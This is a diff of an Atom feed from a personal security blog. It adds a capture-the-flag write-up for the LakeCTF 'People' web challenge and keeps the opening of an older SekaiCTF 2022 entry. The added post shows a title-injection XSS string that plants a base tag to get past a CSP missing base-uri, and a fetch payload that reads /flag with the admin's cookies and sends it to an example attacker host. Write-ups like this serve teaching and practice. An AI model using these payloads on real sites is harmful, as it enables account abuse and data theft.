@@ -1,4 +1,50 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2022-10-12T18:31:48+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2022-10-12T19:49:55+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
+
+<p>This is my writeup to web challenge “<a href="https://ctf.polygl0ts.ch/challenges#People-18">People</a>” in <a href="https://ctf.polygl0ts.ch/">LakeCTF</a> Qualifications round. LakeCTF is orgnised by EPFL’s CTF team <a href="https://polygl0ts.ch/">polygl0ts</a>. This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting <code class="highlighter-rouge">base-uri</code>.</p>
+
+<p>The challenge has a downloadable. Examining the code and the application, users can signup a profile with bio and other information, as well as logging in. Upon logging in, user is redirected to their profile page where user information is shown. Users can also report their profile, resulting in the profile page being visited by an admin bot.</p>
+
+<p>This type of web challenges with a bot visiting the page normally involves in exploiting cross-site scripting (XSS).</p>
+
+<p>It appears that it is likely the XSS is on the profile page that the bot visits, and the page displays user information stored in the database. We set the information of the user when signing up the user, however, the signup endpoint is rate limited, so we cannot test many payload through that endpoint on the live website. There is another <code class="highlighter-rouge">/edit</code> endpoint which also enables us to update user information, and there is no rate limit on that endpoint, so we could conveniently test different input on the live website without setting up our own docker container.</p>
+
+<p>Our team managed to quickly find the potential injection point on the profile page. Despite the input are escaped when rendering the page, we noticed that the title also shows data from the database, and the code does not escape it:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set description = '%s at %s' % (user['title'], user['lab']) %}
+{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
+</code></pre></div></div>
+
+<p>As shown above, the <code class="highlighter-rouge">safe</code> filter in the template disables escaping. Thus, we managed to put HTML and JavaScript code into the webpage.</p>
+
+<h2 id="bypass-csp">Bypass CSP</h2>
+
+<p>Despite we have managed to inject new tags and code, we could still not make the browser to execute our XSS code. This is because the app sets <code class="highlighter-rouge">Content-Security-Policy</code> HTTP header that only script tags with the defined nonce would run.</p>
+
+<p>However, the CSP did not define <code class="highlighter-rouge">base-uri</code>, and two of the <code class="highlighter-rouge">&lt;script&gt;</code> tags on the profile page did not use full URL:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/marked.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/purify.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Conveniently, the XSS injection point is in <code class="highlighter-rouge">&lt;title&gt;</code>, which is in <code class="highlighter-rouge">&lt;head&gt;</code>, thus we are able to define new base:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;base</span> <span class="na">href=</span><span class="s">"https://my-server.example.com"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>This will result in one of the script on the profile page to load from <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code> and execute.</p>
+
+<p>The final info we set to user’s title in their profile is <code class="highlighter-rouge">&lt;/title&gt;&lt;base href="https://my-server.example.com"&gt;&lt;/head&gt;</code>, and we serve the JavaScript payload at <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code>.</p>
+
+<h2 id="getting-the-flag">Getting the Flag</h2>
+
+<p>Now we are able to make the profile page to pop an alert of whatever we put in the JavaScript file. However our goal is to steal the flag. The flag is accessible through the <code class="highlighter-rouge">/flag</code> endpoint in the webapp. The endpoint checks for <code class="highlighter-rouge">admin_token</code> in cookies. We might want to steal the cookies first, however, when the admin bot visits the webpage, their cookie is set to <code class="highlighter-rouge">httpOnly</code>, so we cannot use XSS to get the cookie. As getting the flag is our only goal, we can workaround by using <code class="highlighter-rouge">fetch</code> API or XMLHttpRequest. As when doing such request on the same site, cookies are sent, and flag will be retrieved.</p>
+
+<p>Our final JavaScript for getting the flag and exfil is:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
 
 <p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “<a href="https://ctf.sekai.team/challenges#Perfect-Match-X-treme-44">Perfect Match X-treme</a>” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. The official source code and solution provided by the challenge authors are here: <a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>
 
